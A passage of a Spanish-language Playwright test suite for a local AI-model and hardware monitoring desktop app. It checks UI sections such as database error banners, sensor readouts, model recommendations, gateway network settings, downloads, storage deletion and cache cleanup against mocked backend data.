  await esperar(page, () => document.body.innerText.includes("16.0 GB"), "el detalle con decimal del backend");
  const comaDiag = await page.evaluate(() => {
    const m = document.body.innerText.match(/\d,\d/g);
    return m ? m.slice(0, 5) : [];
  });
  if (comaDiag.length > 0) fallo(`hay cifras con coma decimal en Diagnóstico: ${comaDiag}`);
  const fechaComa = await page.evaluate(() => /\d{2}\/\d{2},/.test(document.body.innerText));
  if (fechaComa) fallo("sigue habiendo una fecha con coma");

  return `fecha/hora "27/09 09:15" y tok/s "41.2 ± 0.8": punto decimal en las cifras, sin coma en ninguna parte`;
});

/* 17. El error de base de datos se ve desde cualquier sección ---------------- */
await t("17. Sin base de datos: el motivo se ve, literal, en cualquier sección", async () => {
  const motivo = "no se pudo abrir /home/usuario/.local/share/machinograph/data.db: database disk image is malformed";

  // Sin error: no hay aviso. Es la mitad que suele olvidarse.
  await irA(page, "Hardware");
  const sinAviso = await page.evaluate(() =>
    [...document.querySelectorAll('[role="alert"]')].some((e) => e.innerText.includes("Sin base de datos")),
  );
  if (sinAviso) fallo("se enseña el aviso de base de datos sin que haya ningún error");

  // Con error: el aviso tiene que aparecer, con el motivo TAL CUAL (es del
  // sistema, no nuestro) y SIN depender de en qué sección estés.
  await page.evaluate(
    (payload) => window.__emitir__("ai:snapshot", payload),
    { ...snapshot, db_error: motivo },
  );
  await esperar(page, () => document.body.innerText.includes("Sin base de datos"), "el aviso de base de datos");

  const aviso = await page.evaluate(() => {
    const el = [...document.querySelectorAll('[role="alert"]')].find((e) =>
      e.innerText.includes("Sin base de datos"),
    );
    if (!el) return null;
    const mono = el.querySelector(".mono");
    return {
      texto: el.innerText.replace(/\s+/g, " "),
      motivo: mono?.innerText ?? "",
      monoFuente: mono ? getComputedStyle(mono).fontFamily : "",
      dentroDeMain: !!el.closest("#contenido"),
    };
  });
  if (!aviso) fallo("no se pinta el aviso de base de datos");
  // El motivo, literal: si se resumiera, el usuario no podría buscar qué le pasa.
  if (!aviso.motivo.includes("database disk image is malformed")) {
    fallo(`el motivo no se enseña literal: ${JSON.stringify(aviso.motivo)}`);
  }
  // Y dice qué SIGUE funcionando: no es solo un grito.
  if (!aviso.texto.includes("siguen funcionando")) {
    fallo(`el aviso no dice qué sigue funcionando: ${aviso.texto.slice(0, 160)}`);
  }
  // Fuera de la sección: se ve estés donde estés (antes esto mataba el proceso).
  if (aviso.dentroDeMain) fallo("el aviso vive dentro de una sección, así que no se vería desde las demás");

  // En otra sección sigue ahí.
  await irA(page, "Descubrir");
  const sigue = await page.evaluate(() => document.body.innerText.includes("Sin base de datos"));
  if (!sigue) fallo("el aviso desaparece al cambiar de sección");

  // Y cuando la BD vuelve, el aviso se va solo.
  await page.evaluate((payload) => window.__emitir__("ai:snapshot", payload), { ...snapshot, db_error: null });
  await page.waitForTimeout(200);
  const seFue = await page.evaluate(() => !document.body.innerText.includes("Sin base de datos"));
  if (!seFue) fallo("el aviso se queda pegado aunque la base de datos ya funcione");

  return "aparece con el motivo literal y qué sigue funcionando · visible desde cualquier sección · se va solo al recuperarse";
});

/* 18. La navegación está AGRUPADA y cada sección dice para qué es ----------- */
await t("18. Cuatro grupos, cada sección con su propósito y sin duplicados", async () => {
  const nav = await page.evaluate(() => {
    const n = document.querySelector('nav[aria-label="Secciones"]');
    if (!n) return null;
    const botones = [...n.querySelectorAll("button")];
    // Los rótulos de grupo son los div.label que no son botones.
    const grupos = [...n.querySelectorAll("div.label")].map((d) => d.innerText.trim());
    const sinProposito = botones.filter((b) => !(b.getAttribute("title") ?? "").trim()).map((b) => b.innerText.trim());
    const duplicados = botones.map((b) => b.innerText.trim()).filter((t, i, a) => a.indexOf(t) !== i);
    return {
      grupos,
      secciones: botones.map((b) => b.innerText.trim()),
      sinProposito,
      duplicados,
    };
  });
  if (!nav) fallo("no se encontró la barra lateral");
  // Los rótulos se pintan en mayúsculas por CSS, así que se compara sin
  // depender de eso (el dato es el nombre, no cómo lo transforme la hoja).
  const grupos = nav.grupos.map((g) => g.toLocaleLowerCase("es"));
  for (const g of ["modelos", "motor", "equipo"]) {
    if (!grupos.includes(g)) fallo(`falta el grupo «${g}» en la barra lateral: ${nav.grupos.join(", ")}`);
  }
  // El problema que se corrigió: doce secciones planas con nombres que se
  // solapaban. Un duplicado en la barra es justo eso, así que se comprueba.
  if (nav.duplicados.length > 0) fallo(`secciones repetidas en la barra: ${nav.duplicados.join(", ")}`);
  if (nav.sinProposito.length > 0) fallo(`secciones sin propósito escrito: ${nav.sinProposito.join(", ")}`);
  // Y la sección de modelos ya no está partida en dos que leen lo mismo.
  const solapan = nav.secciones.filter((s) => /^(Modelos|Inventario|Recomendados)$/.test(s));
  if (solapan.length > 0) fallo(`siguen las secciones solapadas: ${solapan.join(", ")}`);

  // El encabezado repite el propósito de la sección activa: es lo que se lee al
  // llegar y evita tener que adivinar qué hay dentro.
  await irA(page, "En disco");
  const cab = await page.evaluate(() => ({
    titulo: document.getElementById("titulo-seccion")?.innerText.trim() ?? "",
    proposito: document.querySelector("header p")?.innerText.trim() ?? "",
  }));
  if (cab.titulo !== "En disco") fallo(`el título de la sección es «${cab.titulo}»`);
  if (cab.proposito.length < 15) fallo(`la cabecera no explica la sección: «${cab.proposito}»`);

  return `${nav.grupos.length} grupos (${nav.grupos.join(", ")}) · ${nav.secciones.length} secciones, todas con propósito · sin duplicados`;
});

/* 19. Uso: cifras del motor, con «—» cuando no las hay ---------------------- */
await t("19. Uso enseña las cifras del motor y no inventa las que faltan", async () => {
  await irA(page, "Uso");
  // El rótulo se pinta en mayúsculas por CSS y `innerText` las respeta: se busca
  // sin depender de eso.
  await esperar(page, () => /puerta de enlace/i.test(document.body.innerText), "el bloque de la puerta");

  const texto = await page.evaluate(() => document.querySelector("#contenido")?.innerText ?? "");
  // Las cifras del motor, tal cual las publicó: si no están, la vista no sirve.
  for (const trozo of ["128400", "9820", "96100", "42"]) {
    if (!texto.includes(trozo)) fallo(`falta la cifra ${trozo}: ${texto.slice(0, 400)}`);
  }
  // Y la proporción de caché, que es lo que explica por qué la segunda pregunta
  // de un contexto largo es rápida.
  if (!texto.includes("74.8")) fallo("no se enseña el porcentaje de entrada que salió de caché");

  // La petición SIN datos del motor (la tercera del mock) tiene que salir con
  // «—», nunca con un 0: un 0 afirmaría que no se generó nada.
  const filas = await page.$$eval("tbody tr", (fs) => fs.map((f) => f.innerText.replace(/\s+/g, " ")));
  // La petición que el motor no documentó es la que tiene TRES huecos seguidos:
  // entrada, salida y primer token. Se identifica por eso y no por el cliente,
  // que va en el `title` de la celda de la hora (no en el texto).
  const sinDatos = filas.find((f) => (f.match(/—/g) ?? []).length >= 3);
  if (!sinDatos) fallo(`no aparece la petición sin datos del motor: ${JSON.stringify(filas)}`);
  if (!/\s—\s—\s—$/.test(sinDatos)) {
    fallo(`la fila sin datos del motor no usa «—» en sus huecos: ${sinDatos}`);
  }

  // La puerta se enseña con su URL y su clave: es lo que hay que copiar en el
  // cliente para que esto empiece a contar.
  if (!texto.includes("http://127.0.0.1:8090/v1")) fallo("no se enseña la URL de la puerta");
  if (!texto.includes("9f2c1a4b6d8e0f3a5c7b9d1e2f4a6b8c")) fallo("no se enseña la clave");
  // Y dice de dónde sale cada cifra: sin eso, un número manda a adivinar.
  if (!/de dónde sale cada cifra/i.test(texto)) fallo("no se explica el origen de las cifras");

  return `${filas.length} peticiones · cifras del motor + 74.8 % de caché · «—» donde el motor no publicó · puerta y su URL a la vista`;
});

/* 20. Hardware mide todo lo que la máquina expone --------------------------- */
await t("20. Hardware enseña los sensores del equipo, con su procedencia", async () => {
  await irA(page, "Hardware");
  await esperar(page, () => /temperaturas/i.test(document.body.innerText), "el bloque de temperaturas");

  const texto = await page.evaluate(() => document.querySelector("#contenido")?.innerText ?? "");

  // Temperaturas de TODOS los chips, no solo la de la GPU: la CPU (dos sensores
  // distintos: el del die y el del CCD), la placa, el NVMe y los discos.
  for (const trozo of ["Tctl", "Tccd1", "System", "Composite", "nvme1"]) {
    if (!texto.includes(trozo)) fallo(`falta la temperatura «${trozo}»`);
  }

  // Los ventiladores con el nombre que da la placa, y el parado como dato.
  for (const trozo of ["CPU Fan", "Pump Fan", "System Fan #1", "1692 rpm"]) {
    if (!texto.includes(trozo)) fallo(`falta el ventilador «${trozo}»`);
  }
  if (!/System Fan #2[\s\S]{0,40}0 rpm/.test(texto)) {
    fallo("un ventilador parado tiene que salir con 0 rpm, no desaparecer");
  }

  // Voltajes, con los nombres de la placa.
  for (const trozo of ["CPU Vcore", "VBat"]) {
    if (!texto.includes(trozo)) fallo(`falta el voltaje «${trozo}»`);
  }

  // Potencia de la CPU por el contador de energía, y la frecuencia por núcleo.
  if (!texto.includes("62.4 W")) fallo("no se enseña la potencia del paquete de CPU");
  if (!/3503 MHz|3502 MHz/.test(texto)) fallo("no se enseña la frecuencia media por núcleo");

  // Caudal de discos y de red. El disco del mock mueve 12,4 MB/s y la red
  // 1,24 MB/s: si el formateador redondeara a MB enteros, esto saldría como 0.
  if (!/nvme0n1/.test(texto)) fallo("no se enseña el caudal del disco");
  if (!/12 MB\/s/.test(texto)) fallo("el caudal del disco no se enseña en su unidad: " + texto.match(/[\d.,]+ ?k?M?B\/s/g));
  if (!/enp5s0/.test(texto)) fallo("no se enseña el caudal de red");
  if (!/1\.2 MB\/s/.test(texto)) fallo("el caudal de red no se enseña en su unidad");
  // La interfaz sin tráfico NO se enseña (una tabla de ceros no informa), pero se
  // dice cuántas se están vigilando.
  if (/wlp8s0/.test(texto)) fallo("una interfaz sin tráfico no debería ocupar una fila");

  // Los sensores desconectados se cuentan: sin eso, que no salga el VRM parece un
  // fallo del programa en vez de una característica de la placa.
  if (!/16 sensores desconectados/.test(texto)) fallo("no se dice cuántos sensores no están conectados");

  // El chip duplicado va PLEGADO, con su explicación en el resumen: sus 28 filas
  // no pueden competir con las de verdad, pero tampoco se esconden.
  if (!/posible chip duplicado/i.test(texto)) {
    fallo("no se explica (ni se pliega) el chip duplicado de la placa");
  }
  const plegado = await page.$("details summary:text-matches('posible chip duplicado')");
  if (!plegado) fallo("el chip duplicado no está en un bloque plegable");
  await plegado.click();
  await page.waitForTimeout(150);
  const trasAbrir = await page.evaluate(() => document.querySelector("#contenido")?.innerText ?? "");
  if (!/otro driver|no ve girar ninguno/i.test(trasAbrir)) {
    fallo("al abrir el bloque no se explica por qué está ahí");
  }

  // Cada medida lleva su origen en el título: es lo que permite comprobarla.
  const conFuente = await page.evaluate(() =>
    [...document.querySelectorAll("#contenido li[title]")].filter((li) => li.title.startsWith("/sys/class/hwmon")).length,
  );
  if (conFuente < 10) fallo(`solo ${conFuente} filas llevan su ruta sysfs en el título`);

  return `temperaturas de ${"CPU+placa+NVMe+discos"} · ventiladores con su nombre · voltajes · 62.4 W y frecuencia · caudal · ${conFuente} filas con su ruta sysfs`;
});

/**
 * Mueve un deslizador y avisa a React.
 *
 * `page.fill()` no sirve para un `input[type=range]`: React escucha el evento
 * `input` nativo y solo reacciona si el valor se ha cambiado con el `setter` del
 * prototipo (si se asigna `el.value = x` a pelo, React lo ignora porque su
 * descriptor propio se queda por medio).
 */
async function deslizar(page, selector, valor) {
  await page.evaluate(
    ({ sel, v }) => {
      const el = document.querySelector(sel);
      const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
      setter.call(el, String(v));
      el.dispatchEvent(new Event("input", { bubbles: true }));
      el.dispatchEvent(new Event("change", { bubbles: true }));
    },
    { sel: selector, v: valor },
  );
}

/* 21. Descubrir: el deslizador cambia la recomendación y el radar la explica --- */
await t("21. El deslizador velocidad↔capacidad cambia la recomendación y el radar", async () => {
  await irA(page, "Descubrir");
  await esperar(page, () => /Recomendación según lo que priorices/i.test(document.body.innerText), "el bloque de recomendación");

  const caja = "#contenido";
  const leer = async () => {
    const t = await page.evaluate((sel) => document.querySelector(sel)?.innerText ?? "", caja);
    const primera = await page.$$eval("tbody tr", (fs) => fs[0]?.innerText.replace(/\s+/g, " ") ?? "");
    const radar = await page.evaluate(() => {
      const svg = document.querySelector('#contenido svg[role="img"][aria-label^="Perfil del modelo"]');
      if (!svg) return null;
      const path = svg.querySelector("path");
      return { puntos: path?.getAttribute("d") ?? "", etiquetas: svg.getAttribute("aria-label") };
    });
    return { t, primera, radar };
  };

  const inicio = await leer();
  if (!inicio.radar) fallo("no se pinta el radar del modelo recomendado");
  if (!/Perfil del modelo/.test(inicio.radar.etiquetas ?? "")) fallo("el radar no se describe para lectores");
  for (const eje of ["Velocidad", "Calidad", "Encaje", "Contexto", "Holgura"]) {
    if (!inicio.t.includes(eje)) fallo(`falta el eje «${eje}» del perfil`);
  }

  // Con el peso en VELOCIDAD, el primero tiene que ser el más rápido de la lista
  // (el 3B del mock, con speed 98); con el peso en CAPACIDAD, el más capaz (el
  // 32B, con quality 95). Es la prueba de que el deslizador ordena de verdad y
  // no solo mueve un número.
  await deslizar(page, 'input[aria-label="Peso entre velocidad y capacidad"]', 0);
  await page.waitForTimeout(250);
  const rapido = await leer();
  if (!rapido.primera.includes("Llama 3.2 3B")) {
    fallo(`con el peso en velocidad debería ir primero el 3B: ${rapido.primera}`);
  }

  await deslizar(page, 'input[aria-label="Peso entre velocidad y capacidad"]', 100);
  await page.waitForTimeout(250);
  const capaz = await leer();
  if (!capaz.primera.includes("Qwen2.5 32B")) {
    fallo(`con el peso en capacidad debería ir primero el 32B: ${capaz.primera}`);
  }
  // Y el radar cambia con la recomendación: si no, no estaría describiendo al
  // modelo que se enseña.
  if (rapido.radar?.puntos === capaz.radar?.puntos) {
    fallo("el radar no cambió al cambiar el modelo recomendado");
  }

  // El orden de la tabla y el de la recomendación son el MISMO criterio.
  const ajustes = await page.$$eval("tbody tr td:nth-last-child(3)", (ts) => ts.map((x) => parseFloat(x.innerText.trim())));
  const ordenados = ajustes.every((v, i) => i === 0 || !Number.isFinite(v) || !Number.isFinite(ajustes[i - 1]) || ajustes[i - 1] >= v);
  if (!ordenados) fallo(`la tabla no sigue el ajuste: ${ajustes}`);

  // Y el encaje MULTIPLICA: un modelo que no cabe no puede ganar por rápido que
  // sea. El SDXL del mock tiene fit 30, así que con cualquier peso queda abajo.
  const sdxl = await page.$$eval("tbody tr", (fs) => {
    const f = fs.find((x) => x.innerText.includes("SDXL"));
    return f ? parseFloat(f.querySelector("td:nth-last-child(3)")?.innerText ?? "") : null;
  });
  if (sdxl != null && sdxl > 30) fallo(`el SDXL (fit 30) no puede puntuar ${sdxl}`);

  await deslizar(page, 'input[aria-label="Peso entre velocidad y capacidad"]', 50);
  return `radar de 5 ejes · peso en velocidad -> 3B · peso en capacidad -> 32B · el radar cambia con el modelo · el encaje multiplica`;
});

/* 22. Ajustes: la puerta en la red, el arranque y las carpetas -------------- */
await t("22. Ajustes enseña dónde escucha la puerta y con qué se llega desde fuera", async () => {
  await irA(page, "Ajustes");
  await esperar(page, () => /puerta de enlace en la red/i.test(document.body.innerText), "el bloque de red");

  const texto = await page.evaluate(() => document.querySelector("#contenido")?.innerText ?? "");

  // Las tres opciones de escucha, y cuál está activa. «Solo este equipo» tiene que
  // estar SIEMPRE: es la opción segura y no puede desaparecer según la red.
  for (const trozo of ["Solo este equipo", "Solo esta red (192.168.0.104)", "Todas las direcciones"]) {
    if (!texto.includes(trozo)) fallo(`falta la opción de escucha «${trozo}»`);
  }
  const activa = await page.$$eval('input[name="gateway-direccion"]', (rs) => rs.findIndex((r) => r.checked));
  if (activa !== 0) fallo(`debería estar marcada «solo este equipo», y está la ${activa}`);

  // La URL para otro equipo, con la IP REAL de la red (no un ejemplo).
  if (!texto.includes("http://192.168.0.104:8090/v1")) {
    fallo("no se enseña la URL para conectar desde otro equipo");
  }

  // La frontera de seguridad, arriba y legible: es lo único que expone la máquina.
  if (!/expone la máquina a los demás/i.test(texto)) {
    fallo("no se dice que esto expone la máquina");
  }
  if (!/clave obligatoria/i.test(texto)) fallo("no se dice cómo se protege");

  // Con clave exigida, se dice que la pide.
  if (!/pide clave/i.test(texto)) fallo("no se dice si la puerta exige clave");

  // Y SIN clave, se avisa en la propia opción que expone: abrir el puerto a la red
  // sin clave deja la GPU al servicio de cualquiera que llegue.
  await page.evaluate(() => {
    window.__mockRequiereClave = false;
  });
  await irA(page, "Uso");
  await irA(page, "Ajustes");
  await esperar(page, () => /sin clave/i.test(document.body.innerText), "el aviso de puerta sin clave");
  const sinClave = await page.evaluate(() => document.querySelector("#contenido")?.innerText ?? "");
  if (!/sin clave: cualquiera de la red puede usarlo/i.test(sinClave)) {
    fallo("con «sin clave» no se avisa de lo que eso significa");
  }
  await page.evaluate(() => {
    delete window.__mockRequiereClave;
  });

  // El arranque al inicio: desactivado, con su fichero y sin comando inventado.
  if (!/arranque al iniciar sesión/i.test(texto)) fallo("falta el bloque de arranque automático");
  if (!texto.includes(".config/autostart/machinograph.desktop")) fallo("no se dice qué fichero usa");

  // Las carpetas son las del inventario, y se distinguen las que no existen (que
  // no son un error) de las que sí.
  if (!texto.includes("/home/usuario/models")) fallo("faltan las carpetas de modelos");
  if (!/no está/i.test(texto)) fallo("no se distingue una carpeta que no existe en este equipo");
  if (!/2 de 3 existen/.test(texto)) fallo("no se cuentan las carpetas que existen");

  return `3 opciones de escucha (activa «solo este equipo») · URL de red real · frontera de seguridad visible · arranque con su fichero · 2 de 3 carpetas`;
});

/* 23. Descarga: progreso, velocidad medida y cancelar ----------------------- */
await t("23. La descarga enseña el progreso, mide la velocidad y se puede cortar", async () => {
  await irA(page, "Descubrir");
  await esperar(page, () => /descarga/i.test(document.querySelector("#contenido")?.innerText ?? ""), "el panel de descarga");

  const texto = await page.evaluate(() => document.querySelector("#contenido")?.innerText ?? "");
  // Lo que dice llmfit: porcentaje y GB. Se enseña tal cual.
  if (!/34\.2 %/.test(texto)) fallo(`no se enseña el porcentaje: ${texto.slice(0, 300)}`);
  if (!/6\.7 de 19\.6 GB/.test(texto)) fallo("no se enseñan los GB descargados y el total");
  // Lo que MIDE Machinograph: la velocidad y el tiempo que queda.
  if (!/12 MB\/s/.test(texto)) fallo("no se enseña la velocidad medida");
  if (!/unos 18m/.test(texto)) fallo(`no se enseña el tiempo que queda: ${texto.match(/unos [^\n]*/)}`);
  // La carpeta de destino se dice: una descarga de 20 GB no puede ir a un sitio
  // que el usuario no sepa.
  if (!/llmfit\/models/.test(texto)) fallo("no se dice dónde va el fichero");
  // Y la última línea de llmfit, literal.
  if (!/Downloading 6\.7\/19\.6 GB/.test(texto)) fallo("no se enseña la línea del binario");

  // Cancelar: está disponible mientras la descarga corre, y llama al backend.
  const antes = await page.evaluate(() => window.__LLAMADAS__.filter((l) => l.cmd === "descarga:cancelar").length);
  await pulsar(page, 'button:text-is("Cancelar")');
  await page.waitForTimeout(200);
  const despues = await page.evaluate(() => window.__LLAMADAS__.filter((l) => l.cmd === "descarga:cancelar").length);
  if (despues !== antes + 1) fallo("cancelar no llegó al backend");

  // Una descarga que ya terminó NO ofrece cancelar (no hay nada que cortar) y dice
  // qué hacer con el fichero.
  await page.evaluate((payload) => {
    window.__emitir__("ai:descarga", payload);
  }, {
    fase: "terminada", modelo: "Qwen2.5 32B (Q4_K_M)", linea: "Download complete!",
    pct: 100, descargado_gb: 19.6, total_gb: 19.6, b_s: 12_400_000, eta_s: 0,
    carpeta: "/home/usuario/.cache/llmfit/models", error: null,
  });
  await page.waitForTimeout(200);
  const tras = await page.evaluate(() => document.querySelector("#contenido")?.innerText ?? "");
  if (!/terminada/i.test(tras)) fallo("no se dice que la descarga terminó");
  if (await page.$('button:text-is("Cancelar")')) fallo("una descarga terminada no puede ofrecer cancelar");
  if (!/En disco/.test(tras)) fallo("no se dice dónde aparece el modelo descargado");

  return "34.2 % y 6.7/19.6 GB de llmfit · velocidad y tiempo medidos aquí · cancelar · terminada sin botón de cancelar";
});

/* 24. Memoria de la GPU: los pesos y la configuración, no un reparto inventado -- */
await t("24. La memoria enseña los pesos medidos y la configuración del motor", async () => {
  await irA(page, "Hardware");
  await esperar(page, () => /memoria de la gpu/i.test(document.body.innerText), "el bloque de memoria");

  const texto = await page.evaluate(() => document.querySelector("#contenido")?.innerText ?? "");

  // Lo medido: la VRAM en uso y los pesos servidos.
  if (!/9\.8 GB/.test(texto)) fallo(`no se enseña la VRAM en uso: ${texto.slice(0, 400)}`);
  if (!/2\.2 GB de pesos/.test(texto)) fallo("no se enseñan los pesos servidos");
  // El resto, que es la resta de los dos y se dice como tal.
  if (!/Caché KV, sobrecarga y demás/.test(texto)) fallo("no se enseña el resto");
  if (!/7\.6 GB/.test(texto)) fallo("no se enseña el valor del resto (9.84 − 2.22)");

  // La configuración con la que se sirve: es lo que explica por qué un contexto de
  // 65536 tokens no se come la VRAM.
  if (!/65536 tokens/.test(texto)) fallo("no se enseña el contexto servido");
  if (!/cuantizada en q4_0/.test(texto)) fallo("no se dice que la caché KV va cuantizada");
  if (!/todas/.test(texto)) fallo("no se dice cuántas capas están en la GPU");
  if (!/se descarga a los 30 min/.test(texto)) fallo("no se dice cuándo se descarga solo");

  // Y la línea de comandos ENTERA, para poder comprobarlo: es lo que hace
  // verificable todo lo de arriba.
  // La línea de comandos va dentro de un bloque PLEGADO (es larga): se abre para
  // poder leerla, que es como lo haría una persona.
  await page.evaluate(() => {
    const d = [...document.querySelectorAll("#contenido details")].find((x) =>
      /línea de comandos/i.test(x.querySelector("summary")?.innerText ?? ""),
    );
    if (d) d.open = true;
  });
  await page.waitForTimeout(150);
  const cmd = await page.evaluate(
    () => document.querySelector("#contenido details pre")?.innerText ?? "",
  );
  if (!cmd.includes("--cache-type-k q4_0") || !cmd.includes("-c 65536")) {
    fallo(`la línea de comandos no está entera: ${cmd.slice(0, 120)}`);
  }

  // Y se dice lo que NO se puede medir, en vez de inventar una proporción.
  if (!/no se puede medir/i.test(texto)) fallo("no se dice que el reparto no se puede medir");

  return "9.8 de 16 GB · 2.2 GB de pesos + 7.6 GB de resto (resta de medidas) · contexto, KV en q4_0 y capas · la línea de comandos entera";
});

/* 25. Almacenamiento: orden por tamaño, bajar de carpeta y borrar en dos pasos -- */
await t("25. Almacenamiento ordena por tamaño, baja de carpeta y borra a la papelera", async () => {
  await irA(page, "Almacenamiento");
  // La vista solo pinta los mandos cuando ya tiene el árbol (antes enseña
  // "analizando"): esperar el campo es esperar el análisis.
  await page.waitForSelector("#raiz-almacen", { timeout: 8000 });

  // De mayor a menor por defecto: lo primero que se quiere ver es lo que ocupa.
  const filas = await page.$$eval("#contenido tbody tr", (fs) => fs.map((f) => f.innerText.replace(/\s+/g, " ")));
  const iLocal = filas.findIndex((f) => f.includes(".local"));
  const iIso = filas.findIndex((f) => f.includes("pelicula.iso"));
  if (iLocal === -1 || iIso === -1) fallo(`faltan filas: ${JSON.stringify(filas)}`);
  if (iLocal > iIso) fallo("no está ordenado de mayor a menor por tamaño");
  if (!/\d+\.\d GB/.test(filas[0])) fallo(`el tamaño no se enseña en GB con decimales: ${filas[0]}`);

  // La cabecera ordena y lo dice en `aria-sort` (accesible, no solo el icono).
  const antes = await ariaSort(page, "Tamaño");
  await pulsar(page, 'th:has(button:text-is("Tamaño")) >> button');
  const despues = await ariaSort(page, "Tamaño");
  if (antes === despues) fallo(`la cabecera Tamaño no cambió el orden (${antes} → ${despues})`);

  // Bajar a una carpeta vuelve a analizar ESA carpeta (el backend lo confirma).
  await pulsarBoton(page, ".local");
  await esperar(
    page,
    () => document.body.innerText.includes("/home/usuario/.local"),
    "el análisis de .local",
  );
  const pedidas = await page.evaluate(() =>
    window.__LLAMADAS__.filter((l) => l.cmd === "almacen:arbol").map((l) => l.args.args.raiz),
  );
  if (pedidas.at(-1) !== "/home/usuario/.local") {
    fallo(`no se pidió el análisis de .local: ${JSON.stringify(pedidas)}`);
  }

  // Subir vuelve a la carpeta que la contiene.
  await pulsarBoton(page, "Subir");
  await esperar(
    page,
    () =>
      document.body.innerText.includes("/home/usuario") &&
      !document.body.innerText.includes("/home/usuario/.local"),
    "volver al home",
  );

  // Buscar por nombre: recorre el disco, así que va con Enter (no por letra).
  await page.fill("#buscar-almacen", ".iso");
  await page.press("#buscar-almacen", "Enter");
  await esperar(page, () => /resultados para/i.test(document.body.innerText), "los resultados de la búsqueda");
  const res = await page.evaluate(() => document.querySelector("#contenido")?.innerText ?? "");
  if (!/pelicula\.iso/.test(res)) fallo("la búsqueda no devolvió el fichero que coincide");
  // Seleccionar un fichero DESDE LOS RESULTADOS: el total de la confirmación
  // tiene que salir de la lista que se está viendo. Antes solo miraba la tabla
  // del nivel, así que decir «0 B» de un fichero de 3 GB era el resultado.
  await page.click('input[aria-label="Seleccionar pelicula.iso"]');
  await page.waitForTimeout(150);
  const conSeleccion = await page.evaluate(() => document.querySelector("#contenido")?.innerText ?? "");
  if (!/1 elementos, 2\.8 GB/.test(conSeleccion)) {
    fallo(`el total de lo seleccionado desde la búsqueda está mal: ${conSeleccion.match(/[\d.]+ elementos[^\n]*/)}`);
  }
  // Se desmarca para no arrastrar la selección al resto de la comprobación.
  await page.click('input[aria-label="Seleccionar pelicula.iso"]');
  await page.waitForTimeout(120);

  // Y buscando una CARPETA sale SIN tamaño (no se mide su subárbol al buscar):
  // "—", nunca un 0 que se leería como "ocupa cero".
  await page.fill("#buscar-almacen", "Desc");
  await page.press("#buscar-almacen", "Enter");
  await esperar(page, () => /resultados para/i.test(document.body.innerText), "los resultados de la carpeta");
  const resDir = await page.evaluate(() => document.querySelector("#contenido")?.innerText ?? "");
  if (!/Descargas[\s\S]{0,60}—/.test(resDir)) {
    fallo(`la carpeta sin medir no usa «—»: ${resDir.slice(0, 400)}`);
  }
  await pulsarBoton(page, "Quitar búsqueda");

  // Borrar: DOS pasos, y por defecto a la PAPELERA (nunca definitivo a la primera).
  await page.click('input[aria-label="Seleccionar pelicula.iso"]');
  await page.waitForTimeout(120);
  await pulsarBoton(page, "Borrar selección");
  const aviso = await page.evaluate(() => document.querySelector("#contenido [role=alert]")?.innerText ?? "");
  if (!/PAPELERA/i.test(aviso)) fallo(`la confirmación no dice que va a la papelera: ${aviso}`);
  await pulsarBoton(page, "Sí, a la papelera");
  await page.waitForTimeout(300);

  const acciones = await page.evaluate(() =>
    window.__LLAMADAS__.filter((l) => l.cmd === "action:run").map((l) => l.args.aj),
  );
  const borrado = acciones.filter((a) => a.kind === "almacen:borrar").at(-1);
  if (!borrado) fallo("el borrado no llegó al backend");
  if (borrado.args.definitivo !== false) fallo(`el borrado por defecto debe ser a la papelera: ${JSON.stringify(borrado.args)}`);
  if (borrado.args.rutas?.[0] !== "/home/usuario/pelicula.iso") {
    fallo(`las rutas enviadas no son las seleccionadas: ${JSON.stringify(borrado.args.rutas)}`);
  }

  return "orden por tamaño con aria-sort · bajar a .local y volver · búsqueda con «—» en carpetas · borrado en dos pasos, a la PAPELERA";
});

/* 26. Optimización: mide la basura, no deja tocar lo que necesita root --------- */
await t("26. Optimización mide la basura, protege lo de root y gestiona el arranque", async () => {
  await irA(page, "Optimización");
  // El rótulo se pinta en mayúsculas por CSS e `innerText` las respeta: se busca
  // sin depender de eso.
  await esperar(page, () => /se puede liberar/i.test(document.body.innerText), "las cifras del escaneo");

  const texto = await page.evaluate(() => document.querySelector("#contenido")?.innerText ?? "");
  if (!/28\.2 GB/.test(texto)) fallo(`no se enseña el total recuperable: ${texto.slice(0, 300)}`);
  if (!/16\.0 GB/.test(texto)) fallo("no se enseña lo que liberaría el mayor objetivo");
  // Lo que necesita root se enseña CON su comando, no como un botón que fallaría.
  if (!/sudo dnf clean packages/.test(texto)) fallo("no se enseña el comando de lo que necesita root");
  if (!/uv cache prune/.test(texto)) fallo("no se enseña el comando nativo (uv) de lo que se limpia mejor así");

  // Su checkbox está DESHABILITADO: no se puede seleccionar para limpiar.
  const root = await page.$('input[aria-label*="no se limpia desde aquí"]');
  if (!root) fallo("el objetivo que necesita root no está marcado como no limpiable");
  if (!(await root.isDisabled())) fallo("el objetivo que necesita root se puede seleccionar");

  // Marcar una categoría filtra en el CLIENTE: no vuelve a recorrer el disco.
  const antes = await page.evaluate(() => window.__LLAMADAS__.filter((l) => l.cmd === "limpieza:escanear").length);
  await pulsarBoton(page, "Herramientas de IA");
  await page.waitForTimeout(150);
  const despues = await page.evaluate(() => window.__LLAMADAS__.filter((l) => l.cmd === "limpieza:escanear").length);
  if (despues !== antes) fallo(`marcar una categoría volvió a escanear (${antes} → ${despues})`);
  const filtrado = await page.evaluate(() => document.querySelector("#contenido")?.innerText ?? "");
  if (/Caché de pip/.test(filtrado)) fallo("el filtro por categoría no quitó los objetivos de otras categorías");
  if (!/Claude \(registros\)/.test(filtrado)) fallo("el filtro por categoría quitó lo que sí era de esa categoría");

  // Limpiar: dos pasos, y el aviso dice que es DEFINITIVO (no va a la papelera).
  // Se quita antes el filtro de categoría: con «Herramientas de IA» marcado solo
  // queda un objetivo de 0 bytes, no habría nada que marcar y el botón de limpiar
  // estaría deshabilitado (que es justo lo correcto).
  await pulsarBoton(page, "Todas");
  await pulsarBoton(page, "Marcar todo lo que ocupa");
  await pulsarBoton(page, "Limpiar seleccionados");
  const aviso = await page.evaluate(() => document.querySelector("#contenido [role=alert]")?.innerText ?? "");
  if (!/DEFINITIVAMENTE/.test(aviso)) fallo(`la confirmación no dice que es definitivo: ${aviso}`);
  await pulsarBoton(page, "Sí, borrar de verdad");
  await page.waitForTimeout(300);

  const acciones = await page.evaluate(() =>
    window.__LLAMADAS__.filter((l) => l.cmd === "action:run").map((l) => l.args.aj),
  );
  const limpieza = acciones.filter((a) => a.kind === "limpieza:limpiar").at(-1);
  if (!limpieza) fallo("la limpieza no llegó al backend");
  if ((limpieza.args.ids ?? []).includes("dnf")) fallo("se intentó limpiar algo que necesita root");
